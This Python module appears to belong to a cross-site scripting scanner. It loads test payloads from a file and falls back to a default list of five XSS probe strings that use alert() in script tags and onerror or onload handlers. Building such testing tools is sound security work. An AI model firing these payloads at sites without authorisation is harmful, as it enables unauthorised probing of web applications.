import logging
from pathlib import Path
from typing import List

logger = logging.getLogger(__name__)

DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"'><svg/onload=alert(1)>",
    "'><script>alert(document.domain)</script>",
    "<body onload=alert(1)>",
]


def load_payloads(payloads_file: str) -> List[str]:
    path = Path(payloads_file)
    if not path.exists() or not path.is_file():
        logger.warning("Payload file not found, falling back to default payloads: %s", payloads_file)
        return DEFAULT_PAYLOADS
    payloads = []
    for raw_line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        payload = raw_line.strip()
        if payload:
            payloads.append(payload)
    if not payloads:
        logger.warning("Payload file is empty, using default payloads")
        return DEFAULT_PAYLOADS
    return payloads
